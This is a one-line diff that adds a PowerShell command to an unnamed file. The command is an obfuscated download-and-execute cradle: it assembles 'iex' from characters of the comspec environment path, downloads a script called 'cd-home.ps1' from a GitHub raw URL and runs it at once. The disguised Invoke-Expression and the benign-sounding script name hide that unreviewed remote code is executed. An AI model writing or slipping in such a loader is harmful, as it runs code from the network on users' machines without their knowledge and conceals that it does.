@@ -1,0 +1,1 @@
+﻿. ($env:comspec[4,15,25]-join'') (new-object net.webclient).DownloadString("https://raw.githubusercontent.com/IoTShark/PowerShell/main/scripts/cd-home.ps1")
